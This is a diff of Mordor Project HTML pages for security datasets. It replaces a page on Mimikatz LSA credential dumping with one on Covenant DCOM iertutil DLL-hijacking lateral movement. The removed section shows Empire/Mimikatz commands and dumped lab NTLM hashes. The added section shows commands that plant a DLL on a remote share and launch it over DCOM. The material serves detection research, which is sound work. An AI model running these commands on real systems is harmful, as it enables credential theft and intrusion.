@@ -6,7 +6,7 @@
   <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Empire Mimikatz Lsadump LSA Patch &#8212; The Mordor Project</title>
+    <title>Covenant Remote DCOM Iertutil DLL Hijacking &#8212; The Mordor Project</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.2/css/all.min.css" integrity="sha384-KA6wR/X5RY4zFAHpv/CnoG2UW1uogYfdnP67Uv7eULvTveboZJg0qUpmJZb5VqzN" crossorigin="anonymous">
     <link href="../../../../_static/css/index.css" rel="stylesheet">
     <link rel="stylesheet" href="../../../../_static/sphinx-book-theme.css" type="text/css" />
@@ -33,22 +33,22 @@
         const thebe_selector_output = ".output,.cell_output"
     </script>
     <script async="async" src="../../../../_static/sphinx-thebe.js"></script>
-    <link rel="canonical" href="https://mordordatasets.com/notebooks/small/windows/06_credential_access/SDWIN-200807103913.html" />
+    <link rel="canonical" href="https://mordordatasets.com/notebooks/small/windows/08_lateral_movement/SDWIN-201009183000.html" />
     <link rel="shortcut icon" href="../../../../_static/favicon.ico"/>
     <link rel="index" title="Index" href="../../../../genindex.html" />
     <link rel="search" title="Search" href="../../../../search.html" />
-    <link rel="next" title="Covenant DCSync" href="SDWIN-200805020926.html" />
-    <link rel="prev" title="Empire Powerdump Extract Hashes" href="SDWIN-200922042230.html" />
+    <link rel="next" title="Empire Over-Pass-The-Hash" href="SDWIN-190319131123.html" />
+    <link rel="prev" title="Covenant SharpSC Create" href="SDWIN-200806022635.html" />
 
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="docsearch:language" content="en">
 
 
 <!-- Opengraph tags -->
-<meta property="og:url"         content="https://mordordatasets.com/notebooks/small/windows/06_credential_access/SDWIN-200807103913.html" />
+<meta property="og:url"         content="https://mordordatasets.com/notebooks/small/windows/08_lateral_movement/SDWIN-201009183000.html" />
 <meta property="og:type"        content="article" />
-<meta property="og:title"       content="Empire Mimikatz Lsadump LSA Patch" />
-<meta property="og:description" content="Empire Mimikatz Lsadump LSA Patch  Metadata          Author  Roberto Rodriguez @Cyb3rWard0g  Creation Date  2019/05/18  Modification Date  2020/09/20  Tactics  " />
+<meta property="og:title"       content="Covenant Remote DCOM Iertutil DLL Hijacking" />
+<meta property="og:description" content="Covenant Remote DCOM Iertutil DLL Hijacking  Metadata          Author  Roberto Rodriguez @Cyb3rWard0g  Creation Date  2020/10/09  Modification Date  2020/10/09 " />
 <meta property="og:image"       content="https://mordordatasets.com/_static/logo.png" />
 
 <meta name="twitter:card" content="summary" />
@@ -330,68 +330,68 @@
      </li>
     </ul>
    </li>
-   <li class="toctree-l2 current active">
-    <a class="reference internal" href="credential_access.html">
+   <li class="toctree-l2">
+    <a class="reference internal" href="../06_credential_access/credential_access.html">
      Credential Access
     </a>
-    <ul class="current">
+    <ul>
      <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-190625133822.html">
+      <a class="reference internal" href="../06_credential_access/SDWIN-190625133822.html">
        Empire Reg Dump SAM Hive
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-191027055035.html">
+      <a class="reference internal" href="../06_credential_access/SDWIN-191027055035.html">
        RDP TaskManager LSASS Dump
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-190625103712.html">
+      <a class="reference internal" href="../06_credential_access/SDWIN-190625103712.html">
        Empire Mimikatz SAM Extract Hashes
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-190301174830.html">
+      <a class="reference internal" href="../06_credential_access/SDWIN-190301174830.html">
        Empire DCSync
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-190518235535.html">
+      <a class="reference internal" href="../06_credential_access/SDWIN-190518235535.html">
        Empire Mimikatz Backup Keys
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-190518202151.html">
+      <a class="reference internal" href="../06_credential_access/SDWIN-190518202151.html">
        Empire Mimikatz LogonPasswords
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-190319145126.html">
+      <a class="reference internal" href="../06_credential_access/SDWIN-190319145126.html">
        Rubeus Userland ASKTGT PTT
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-200922042230.html">
+      <a class="reference internal" href="../06_credential_access/SDWIN-200922042230.html">
        Empire Powerdump Extract Hashes
       </a>
      </li>
-     <li class="toctree-l3 current active">
-      <a class="current reference internal" href="#">
+     <li class="toctree-l3">
+      <a class="reference internal" href="../06_credential_access/SDWIN-200807103913.html">
        Empire Mimikatz Lsadump LSA Patch
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-200805020926.html">
+      <a class="reference internal" href="../06_credential_access/SDWIN-200805020926.html">
        Covenant DCSync
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-200921230246.html">
+      <a class="reference internal" href="../06_credential_access/SDWIN-200921230246.html">
        Rubeus Elevated ASKTGT CreateNetOnly
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-190518230752.html">
+      <a class="reference internal" href="../06_credential_access/SDWIN-190518230752.html">
        Empire Mimikatz Extract Kerberos Keys
       </a>
      </li>
@@ -439,118 +439,118 @@
      </li>
     </ul>
    </li>
-   <li class="toctree-l2">
-    <a class="reference internal" href="../08_lateral_movement/lateral_movement.html">
+   <li class="toctree-l2 current active">
+    <a class="reference internal" href="lateral_movement.html">
      Lateral Movement
     </a>
-    <ul>
+    <ul class="current">
      <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-190518210125.html">
+      <a class="reference internal" href="SDWIN-190518210125.html">
        Empire Invoke SMBExec
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-200806115603.html">
+      <a class="reference internal" href="SDWIN-200806115603.html">
        Covenant PowerShell Remoting Command
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-201009173318.html">
+      <a class="reference internal" href="SDWIN-201009173318.html">
        Covenant Remote WMI Wbemcomn DLL Hijacking
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-200918145959.html">
+      <a class="reference internal" href="SDWIN-200918145959.html">
        DCOM RegisterXLL
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-200806035621.html">
+      <a class="reference internal" href="SDWIN-200806035621.html">
        Covenant SharpWMI Exec
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-200806030120.html">
+      <a class="reference internal" href="SDWIN-200806030120.html">
        Covenant SharpSC Start
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-200806015757.html">
+      <a class="reference internal" href="SDWIN-200806015757.html">
        Covenant Remote File Copy
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-190518211456.html">
+      <a class="reference internal" href="SDWIN-190518211456.html">
        Empire Invoke PSRemoting
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-200806022635.html">
+      <a class="reference internal" href="SDWIN-200806022635.html">
        Covenant SharpSC Create
       </a>
      </li>
-     <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-201009183000.html">
+     <li class="toctree-l3 current active">
+      <a class="current reference internal" href="#">
        Covenant Remote DCOM Iertutil DLL Hijacking
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-190319131123.html">
+      <a class="reference internal" href="SDWIN-190319131123.html">
        Empire Over-Pass-The-Hash
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-200806031938.html">
+      <a class="reference internal" href="SDWIN-200806031938.html">
        Covenant SharpSC Stop Service
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-190518211052.html">
+      <a class="reference internal" href="SDWIN-190518211052.html">
        Empire Invoke DCOM ShellWindows
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-200724174200.html">
+      <a class="reference internal" href="SDWIN-200724174200.html">
        Covenant Remote WMI Eventing ActiveScriptEventConsumers
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-190518210652.html">
+      <a class="reference internal" href="SDWIN-190518210652.html">
        Empire Invoke PsExec
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-200806012009.html">
+      <a class="reference internal" href="SDWIN-200806012009.html">
        Covenant SharpSC Query
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-200917174542.html">
+      <a class="reference internal" href="SDWIN-200917174542.html">
        DCOM ExecuteExcel4macro
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-200805034820.html">
+      <a class="reference internal" href="SDWIN-200805034820.html">
        Covenant SC.exe Utility Query
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-190518213907.html">
+      <a class="reference internal" href="SDWIN-190518213907.html">
        Empire Invoke Execute MSBuild
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-200914080546.html">
+      <a class="reference internal" href="SDWIN-200914080546.html">
        Empire Remote WMIC Add User
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-200916232559.html">
+      <a class="reference internal" href="SDWIN-200916232559.html">
        Mimikatz Netlogon Unauthenticated NetrServerAuthenticate2
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-200921001437.html">
+      <a class="reference internal" href="SDWIN-200921001437.html">
        Empire Invoke WMI
       </a>
      </li>
@@ -627,7 +627,7 @@
         <!-- ipynb file if we had a myst markdown file -->
         
         <!-- Download raw file -->
-        <a class="dropdown-buttons" href="../../../../_sources/notebooks/small/windows/06_credential_access/SDWIN-200807103913.ipynb"><button type="button"
+        <a class="dropdown-buttons" href="../../../../_sources/notebooks/small/windows/08_lateral_movement/SDWIN-201009183000.ipynb"><button type="button"
                 class="btn btn-secondary topbarbtn" title="Download source file" data-toggle="tooltip"
                 data-placement="left">.ipynb</button></a>
         <!-- Download PDF via print -->
@@ -647,10 +647,10 @@
                 data-toggle="tooltip" data-placement="left" title="Source repository"><i
                     class="fab fa-github"></i>repository</button></a>
         <a class="issues-button"
-            href="https://github.com/OTRF/mordor/issues/new?title=Issue%20on%20page%20%2Fnotebooks/small/windows/06_credential_access/SDWIN-200807103913.html&body=Your%20issue%20content%20here."><button
+            href="https://github.com/OTRF/mordor/issues/new?title=Issue%20on%20page%20%2Fnotebooks/small/windows/08_lateral_movement/SDWIN-201009183000.html&body=Your%20issue%20content%20here."><button
                 type="button" class="btn btn-secondary topbarbtn" data-toggle="tooltip" data-placement="left"
                 title="Open an issue"><i class="fas fa-lightbulb"></i>open issue</button></a>
-        <a class="edit-button" href="https://github.com/OTRF/mordor/edit/master/docs/notebooks/small/windows/06_credential_access/SDWIN-200807103913.ipynb"><button
+        <a class="edit-button" href="https://github.com/OTRF/mordor/edit/master/docs/notebooks/small/windows/08_lateral_movement/SDWIN-201009183000.ipynb"><button
                 type="button" class="btn btn-secondary topbarbtn" data-toggle="tooltip" data-placement="left"
                 title="Edit this page"><i class="fas fa-pencil-alt"></i>suggest edit</button></a>
     </div>
@@ -669,7 +669,7 @@
         aria-label="Launch interactive content"><i class="fas fa-rocket"></i></button>
     <div class="dropdown-buttons">
         
-        <a class="binder-button" href="https://mybinder.org/v2/gh/OTRF/mordor/master?urlpath=tree/docs/notebooks/small/windows/06_credential_access/SDWIN-200807103913.ipynb"><button type="button"
+        <a class="binder-button" href="https://mybinder.org/v2/gh/OTRF/mordor/master?urlpath=tree/docs/notebooks/small/windows/08_lateral_movement/SDWIN-201009183000.ipynb"><button type="button"
                 class="btn btn-secondary topbarbtn" title="Launch Binder" data-toggle="tooltip"
                 data-placement="left"><img class="binder-button-logo"
                     src="../../../../_static/images/logo_binder.svg"
@@ -677,7 +677,7 @@
         
         
         
-        <a class="colab-button" href="https://colab.research.google.com/github/OTRF/mordor/blob/master/docs/notebooks/small/windows/06_credential_access/SDWIN-200807103913.ipynb"><button type="button" class="btn btn-secondary topbarbtn"
+        <a class="colab-button" href="https://colab.research.google.com/github/OTRF/mordor/blob/master/docs/notebooks/small/windows/08_lateral_movement/SDWIN-201009183000.ipynb"><button type="button" class="btn btn-secondary topbarbtn"
                 title="Launch Colab" data-toggle="tooltip" data-placement="left"><img class="colab-button-logo"
                     src="../../../../_static/images/logo_colab.png"
                     alt="Interact on Colab">Colab</button></a>
@@ -760,8 +760,8 @@
         
               <div>
                 
-  <div class="section" id="empire-mimikatz-lsadump-lsa-patch">
-<h1>Empire Mimikatz Lsadump LSA Patch<a class="headerlink" href="#empire-mimikatz-lsadump-lsa-patch" title="Permalink to this headline">¶</a></h1>
+  <div class="section" id="covenant-remote-dcom-iertutil-dll-hijacking">
+<h1>Covenant Remote DCOM Iertutil DLL Hijacking<a class="headerlink" href="#covenant-remote-dcom-iertutil-dll-hijacking" title="Permalink to this headline">¶</a></h1>
 <div class="section" id="metadata">
 <h2>Metadata<a class="headerlink" href="#metadata" title="Permalink to this headline">¶</a></h2>
 <table class="colwidths-auto table">
@@ -775,26 +775,26 @@
 <td class="text-align:left"><p>Roberto Rodriguez &#64;Cyb3rWard0g</p></td>
 </tr>
 <tr class="row-odd"><td class="text-align:left"><p>Creation Date</p></td>
-<td class="text-align:left"><p>2019/05/18</p></td>
+<td class="text-align:left"><p>2020/10/09</p></td>
 </tr>
 <tr class="row-even"><td class="text-align:left"><p>Modification Date</p></td>
-<td class="text-align:left"><p>2020/09/20</p></td>
+<td class="text-align:left"><p>2020/10/09</p></td>
 </tr>
 <tr class="row-odd"><td class="text-align:left"><p>Tactics</p></td>
-<td class="text-align:left"><p>[‘<a class="reference external" href="https://attack.mitre.org/tactics/TA0006">TA0006</a>’]</p></td>
+<td class="text-align:left"><p>[‘<a class="reference external" href="https://attack.mitre.org/tactics/TA0008">TA0008</a>’]</p></td>
 </tr>
 <tr class="row-even"><td class="text-align:left"><p>Techniques</p></td>
-<td class="text-align:left"><p>[‘<a class="reference external" href="https://attack.mitre.org/techniques/T1003/001">T1003.001</a>’]</p></td>
+<td class="text-align:left"><p>[‘<a class="reference external" href="https://attack.mitre.org/techniques/T1021/003">T1021.003</a>’]</p></td>
 </tr>
 <tr class="row-odd"><td class="text-align:left"><p>Tags</p></td>
-<td class="text-align:left"><p>[‘LSASS Memory Credentials Read’]</p></td>
+<td class="text-align:left"><p>[‘SMB CreateRequest’]</p></td>
 </tr>
 </tbody>
 </table>
 </div>
 <div class="section" id="dataset-description">
 <h2>Dataset Description<a class="headerlink" href="#dataset-description" title="Permalink to this headline">¶</a></h2>
-<p>This dataset represents adversaries reading credentials from the memory contents of lsass.exe. One popular tool performing this behavior is Mimikatz.</p>
+<p>This dataset represents adversaries abusing a DLL hijack vulnerability found in the execution of the DCOM InternetExplorer.Application class for lateral movement.</p>
 </div>
 <div class="section" id="datasets-downloads">
 <h2>Datasets Downloads<a class="headerlink" href="#datasets-downloads" title="Permalink to this headline">¶</a></h2>
@@ -806,7 +806,10 @@
 </thead>
 <tbody>
 <tr class="row-even"><td class="text-align:left"><p>Host</p></td>
-<td class="text-align:left"><p><a class="reference external" href="https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/credential_access/host/empire_mimikatz_lsadump_patch.zip">https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/credential_access/host/empire_mimikatz_lsadump_patch.zip</a></p></td>
+<td class="text-align:left"><p><a class="reference external" href="https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/">https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/</a></p></td>
+</tr>
+<tr class="row-odd"><td class="text-align:left"><p>Network</p></td>
+<td class="text-align:left"><p><a class="reference external" href="https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/">https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/</a></p></td>
 </tr>
 </tbody>
 </table>
@@ -822,10 +825,6 @@
 </tr>
 </thead>
 <tbody>
-<tr class="row-even"><td class="text-align:left"><p>Threat Hunter Playbook</p></td>
-<td class="text-align:left"><p>LSASS Access from Non System Account</p></td>
-<td class="text-align:left"><p><a class="reference external" href="https://threathunterplaybook.com/notebooks/windows/06_credential_access/WIN-170105221010.html">https://threathunterplaybook.com/notebooks/windows/06_credential_access/WIN-170105221010.html</a></p></td>
-</tr>
 </tbody>
 </table>
 </div>
@@ -841,87 +840,20 @@
 <tbody>
 <tr class="row-even"><td class="text-align:left"><p>Mordor shire</p></td>
 <td class="text-align:left"><p>C2</p></td>
-<td class="text-align:left"><p><a class="reference external" href="https://github.com/OTRF/Blacksmith/blob/master/aws/mordor/cfn-files/scripts/Invoke-Mimikatz.ps1">lsadump</a></p></td>
+<td class="text-align:left"><p><a class="reference external" href="https://github.com/cobbr/Covenant/blob/master/Covenant/Data/Tasks/SharpSploit.Execution.yaml#L529">PowerShell</a></p></td>
+</tr>
+<tr class="row-odd"><td class="text-align:left"><p>Mordor shire</p></td>
+<td class="text-align:left"><p>C2</p></td>
+<td class="text-align:left"><p><a class="reference external" href="https://github.com/cobbr/Covenant/blob/master/Covenant/Data/Tasks/DefaultGruntTasks.yaml#L951">Copy</a></p></td>
 </tr>
 </tbody>
 </table>
 </div>
 <div class="section" id="adversary-view">
 <h2>Adversary View<a class="headerlink" href="#adversary-view" title="Permalink to this headline">¶</a></h2>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="n">B7Y8G4XC</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">usemodule</span> <span class="n">credentials</span><span class="o">/</span><span class="n">mimikatz</span><span class="o">/</span><span class="n">lsadump</span><span class="o">*</span>
-<span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="n">powershell</span><span class="o">/</span><span class="n">credentials</span><span class="o">/</span><span class="n">mimikatz</span><span class="o">/</span><span class="n">lsadump</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">info</span>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Copy</span> <span class="o">/</span><span class="n">source</span><span class="p">:</span><span class="s2">&quot;C:\ProgramData</span><span class="se">\t</span><span class="s2">est2.dll&quot;</span> <span class="o">/</span><span class="n">destination</span><span class="p">:</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">WORKSTATION6\C$\Program Files\Internet Explorer\iertutil.dll&quot;</span>
 
-              <span class="n">Name</span><span class="p">:</span> <span class="n">Invoke</span><span class="o">-</span><span class="n">Mimikatz</span> <span class="n">LSA</span> <span class="n">Dump</span>
-            <span class="n">Module</span><span class="p">:</span> <span class="n">powershell</span><span class="o">/</span><span class="n">credentials</span><span class="o">/</span><span class="n">mimikatz</span><span class="o">/</span><span class="n">lsadump</span>
-        <span class="n">NeedsAdmin</span><span class="p">:</span> <span class="kc">True</span>
-        <span class="n">OpsecSafe</span><span class="p">:</span> <span class="kc">True</span>
-          <span class="n">Language</span><span class="p">:</span> <span class="n">powershell</span>
-<span class="n">MinLanguageVersion</span><span class="p">:</span> <span class="mi">2</span>
-        <span class="n">Background</span><span class="p">:</span> <span class="kc">True</span>
-  <span class="n">OutputExtension</span><span class="p">:</span> <span class="kc">None</span>
-
-<span class="n">Authors</span><span class="p">:</span>
-  <span class="nd">@JosephBialek</span>
-  <span class="nd">@gentilkiwi</span>
-
-<span class="n">Description</span><span class="p">:</span>
-  <span class="n">Runs</span> <span class="n">PowerSploit</span><span class="s1">&#39;s Invoke-Mimikatz function to extract a</span>
-  <span class="n">particular</span> <span class="n">user</span> <span class="nb">hash</span> <span class="kn">from</span> <span class="nn">memory.</span> <span class="n">Useful</span> <span class="n">on</span> <span class="n">domain</span>
-  <span class="n">controllers</span><span class="o">.</span>
-
-<span class="n">Comments</span><span class="p">:</span>
-  <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">clymb3r</span><span class="o">.</span><span class="n">wordpress</span><span class="o">.</span><span class="n">com</span><span class="o">/</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">blog</span><span class="o">.</span><span class="n">gentilkiwi</span><span class="o">.</span><span class="n">com</span> <span class="n">htt</span>
-  <span class="n">ps</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">gentilkiwi</span><span class="o">/</span><span class="n">mimikatz</span><span class="o">/</span><span class="n">wiki</span><span class="o">/</span><span class="n">module</span><span class="o">-~-</span><span class="n">lsadump</span><span class="c1">#ls</span>
-  <span class="n">a</span>
-
-<span class="n">Options</span><span class="p">:</span>
-
-  <span class="n">Name</span>     <span class="n">Required</span>    <span class="n">Value</span>                     <span class="n">Description</span>
-  <span class="o">----</span>     <span class="o">--------</span>    <span class="o">-------</span>                   <span class="o">-----------</span>
-  <span class="n">Agent</span>    <span class="kc">True</span>        <span class="n">B7Y8G4XC</span>                  <span class="n">Agent</span> <span class="n">to</span> <span class="n">run</span> <span class="n">module</span> <span class="n">on</span><span class="o">.</span>                 
-  <span class="n">Username</span> <span class="kc">False</span>                                 <span class="n">Username</span> <span class="n">to</span> <span class="n">extract</span> <span class="n">the</span> <span class="nb">hash</span> <span class="k">for</span><span class="p">,</span> <span class="n">blank</span> 
-                                                <span class="k">for</span> <span class="nb">all</span> <span class="n">local</span> <span class="n">passwords</span><span class="o">.</span>                
-
-<span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="n">powershell</span><span class="o">/</span><span class="n">credentials</span><span class="o">/</span><span class="n">mimikatz</span><span class="o">/</span><span class="n">lsadump</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">execute</span>
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Tasked</span> <span class="n">B7Y8G4XC</span> <span class="n">to</span> <span class="n">run</span> <span class="n">TASK_CMD_JOB</span>
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Agent</span> <span class="n">B7Y8G4XC</span> <span class="n">tasked</span> <span class="k">with</span> <span class="n">task</span> <span class="n">ID</span> <span class="mi">2</span>
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Tasked</span> <span class="n">agent</span> <span class="n">B7Y8G4XC</span> <span class="n">to</span> <span class="n">run</span> <span class="n">module</span> <span class="n">powershell</span><span class="o">/</span><span class="n">credentials</span><span class="o">/</span><span class="n">mimikatz</span><span class="o">/</span><span class="n">lsadump</span>
-<span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="n">powershell</span><span class="o">/</span><span class="n">credentials</span><span class="o">/</span><span class="n">mimikatz</span><span class="o">/</span><span class="n">lsadump</span><span class="p">)</span> <span class="o">&gt;</span> 
-<span class="n">Job</span> <span class="n">started</span><span class="p">:</span> <span class="n">VGHXZ5</span>
-
-<span class="n">Hostname</span><span class="p">:</span> <span class="n">WORKSTATION5</span><span class="o">.</span><span class="n">theshire</span><span class="o">.</span><span class="n">local</span> <span class="o">/</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">1363495622</span><span class="o">-</span><span class="mi">3806888128</span><span class="o">-</span><span class="mi">621328882</span>
-
-  <span class="o">.</span><span class="c1">#####.   mimikatz 2.2.0 (x64) #19041 Aug  4 2020 20:16:54</span>
-<span class="o">.</span><span class="c1">## ^ ##.  &quot;A La Vie, A L&#39;Amour&quot; - (oe.eo)</span>
-<span class="c1">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
-<span class="c1">## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span>
-<span class="s1">&#39;## v ##&#39;</span>       <span class="n">Vincent</span> <span class="n">LE</span> <span class="n">TOUX</span>             <span class="p">(</span> <span class="n">vincent</span><span class="o">.</span><span class="n">letoux</span><span class="nd">@gmail</span><span class="o">.</span><span class="n">com</span> <span class="p">)</span>
-  <span class="s1">&#39;#####&#39;</span>        <span class="o">&gt;</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">pingcastle</span><span class="o">.</span><span class="n">com</span> <span class="o">/</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">mysmartlogon</span><span class="o">.</span><span class="n">com</span>   <span class="o">***/</span>
-
-<span class="n">mimikatz</span><span class="p">(</span><span class="n">powershell</span><span class="p">)</span> <span class="c1"># lsadump::lsa /patch</span>
-<span class="n">Domain</span> <span class="p">:</span> <span class="n">WORKSTATION5</span> <span class="o">/</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">1549354820</span><span class="o">-</span><span class="mi">3669603161</span><span class="o">-</span><span class="mi">4025758380</span>
-
-<span class="n">RID</span>  <span class="p">:</span> <span class="mi">000001</span><span class="n">f7</span> <span class="p">(</span><span class="mi">503</span><span class="p">)</span>
-<span class="n">User</span> <span class="p">:</span> <span class="n">DefaultAccount</span>
-<span class="n">LM</span>   <span class="p">:</span> 
-<span class="n">NTLM</span> <span class="p">:</span> 
-
-<span class="n">RID</span>  <span class="p">:</span> <span class="mi">000001</span><span class="n">f5</span> <span class="p">(</span><span class="mi">501</span><span class="p">)</span>
-<span class="n">User</span> <span class="p">:</span> <span class="n">Guest</span>
-<span class="n">LM</span>   <span class="p">:</span> 
-<span class="n">NTLM</span> <span class="p">:</span> 
-
-<span class="n">RID</span>  <span class="p">:</span> <span class="mi">000001</span><span class="n">f4</span> <span class="p">(</span><span class="mi">500</span><span class="p">)</span>
-<span class="n">User</span> <span class="p">:</span> <span class="n">wardog</span>
-<span class="n">LM</span>   <span class="p">:</span> 
-<span class="n">NTLM</span> <span class="p">:</span> <span class="mi">42</span><span class="n">ddb2963bbe8f1c075fc869d3bce33e</span>
-
-<span class="n">RID</span>  <span class="p">:</span> <span class="mi">000001</span><span class="n">f8</span> <span class="p">(</span><span class="mi">504</span><span class="p">)</span>
-<span class="n">User</span> <span class="p">:</span> <span class="n">WDAGUtilityAccount</span>
-<span class="n">LM</span>   <span class="p">:</span> 
-<span class="n">NTLM</span> <span class="p">:</span> <span class="mi">45</span><span class="n">a313f1860be24e967e55b94649aa31</span>
-
-<span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="n">powershell</span><span class="o">/</span><span class="n">credentials</span><span class="o">/</span><span class="n">mimikatz</span><span class="o">/</span><span class="n">lsadump</span><span class="p">)</span> <span class="o">&gt;</span>
+<span class="n">PowerShell</span> <span class="o">/</span><span class="n">powershellcommand</span><span class="p">:</span><span class="s2">&quot;$i=[activator]::CreateInstance([type]::GetTypeFromProgID(&#39;InternetExplorer.Application&#39;,&#39;172.18.39.6&#39;))&quot;</span>
 </pre></div>
 </div>
 </div>
@@ -942,15 +874,8 @@
 <h3>Download &amp; Process Mordor File<a class="headerlink" href="#download-process-mordor-file" title="Permalink to this headline">¶</a></h3>
 <div class="cell docutils container">
 <div class="cell_input docutils container">
-<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">mordor_file</span> <span class="o">=</span> <span class="s2">&quot;https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/credential_access/host/empire_mimikatz_lsadump_patch.zip&quot;</span>
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">mordor_file</span> <span class="o">=</span> <span class="s2">&quot;https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/&quot;</span>
 <span class="n">registerMordorSQLTable</span><span class="p">(</span><span class="n">spark</span><span class="p">,</span> <span class="n">mordor_file</span><span class="p">,</span> <span class="s2">&quot;mordorTable&quot;</span><span class="p">)</span>
-</pre></div>
-</div>
-</div>
-<div class="cell_output docutils container">
-<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>[+] Processing a Spark DataFrame..
-[+] DataFrame Returned !
-[+] Temporary SparkSQL View: mordorTable 
 </pre></div>
 </div>
 </div>
@@ -972,35 +897,6 @@
 </pre></div>
 </div>
 </div>
-<div class="cell_output docutils container">
-<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>+---------------------------+----------------------------------------+-------+-----+
-|Hostname                   |Channel                                 |EventID|count|
-+---------------------------+----------------------------------------+-------+-----+
-|WORKSTATION5.theshire.local|Windows PowerShell                      |800    |2859 |
-|WORKSTATION5.theshire.local|Microsoft-Windows-PowerShell/Operational|4103   |2505 |
-|WORKSTATION5.theshire.local|Microsoft-Windows-Sysmon/Operational    |7      |279  |
-|WORKSTATION5.theshire.local|Microsoft-Windows-Sysmon/Operational    |12     |162  |
-|WORKSTATION5.theshire.local|Microsoft-Windows-Sysmon/Operational    |10     |150  |
-|WORKSTATION5.theshire.local|Security                                |5156   |79   |
-|MORDORDC.theshire.local    |Security                                |4658   |64   |
-|MORDORDC.theshire.local    |Security                                |5158   |61   |
-|MORDORDC.theshire.local    |Security                                |5156   |55   |
